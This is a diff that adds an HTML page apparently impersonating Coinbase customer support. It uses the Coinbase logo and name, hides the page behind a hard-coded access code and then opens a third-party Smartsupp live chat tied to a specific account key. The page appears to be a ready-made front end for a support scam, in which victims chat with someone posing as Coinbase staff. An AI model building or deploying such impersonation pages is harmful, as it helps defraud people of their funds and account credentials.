@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Coinbase Support - Customer Service</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #0052ff, #0d1b2a);
+        margin: 0;
+        padding: 0;
+        color: white;
+        text-align: center;
+    }
+    .container {
+        margin-top: 80px;
+        animation: fadeIn 1.2s ease-in-out;
+    }
+    img.logo {
+        width: 120px;
+        margin-bottom: 20px;
+    }
+    h1 {
+        font-weight: bold;
+        margin-bottom: 5px;
+    }
+    h3 {
+        margin-bottom: 30px;
+        font-weight: normal;
+        opacity: 0.9;
+    }
+    .access-box {
+        background: rgba(255, 255, 255, 0.1);
+        padding: 25px;
+        border-radius: 12px;
+        max-width: 350px;
+        margin: auto;
+        box-shadow: 0px 0px 15px rgba(0,0,0,0.2);
+        animation: fadeIn 1.5s ease-in-out;
+    }
+    input {
+        padding: 10px;
+        width: 80%;
+        margin-bottom: 15px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        text-align: center;
+        outline: none;
+    }
+    button {
+        background: #0052ff;
+        color: white;
+        padding: 10px 20px;
+        font-size: 16px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        box-shadow: 0px 0px 15px #0052ff;
+        transition: all 0.3s ease;
+    }
+    button:hover {
+        background: #003bb3;
+        box-shadow: 0px 0px 20px #66a3ff;
+    }
+    #chat {
+        display: none;
+        animation: fadeIn 1.5s ease-in-out;
+    }
+    footer {
+        margin-top: 50px;
+        font-size: 14px;
+        opacity: 0.8;
+    }
+    @keyframes fadeIn {
+        from {opacity: 0; transform: translateY(15px);}
+        to {opacity: 1; transform: translateY(0);}
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Coinbase_logo.svg" alt="Coinbase Logo" class="logo">
+    <h1>COINBASE SUPPORT</h1>
+    <h3>Customer Service</h3>
+
+    <div id="accessForm" class="access-box">
+        <p>Secure Access — Enter Code:</p>
+        <input type="password" id="code" placeholder="Enter code">
+        <br>
+        <button onclick="checkCode()">Start Chat</button>
+    </div>
+
+    <div id="chat">
+        <h2>Welcome to Customer Service</h2>
+        <!-- Smartsupp Live Chat script -->
+        <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = '5f52518f4980d6c406ac0ea87b460b3ff9aa3f45';
+        window.smartsupp||(function(d) {
+            var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+            s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+            c.type='text/javascript';c.charset='utf-8';c.async=true;
+            c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+        })(document);
+        </script>
+    </div>
+</div>
+
+<footer>Powered by Coinbase Support</footer>
+
+<script>
+    const accessCode = "SUPPORT2025";
+    function checkCode() {
+        const enteredCode = document.getElementById("code").value;
+        if (enteredCode === accessCode) {
+            document.getElementById("accessForm").style.display = "none";
+            document.getElementById("chat").style.display = "block";
+        } else {
+            alert("Incorrect code. Please try again.");
+        }
+    }
+</script>
+
+</body>
+</html>
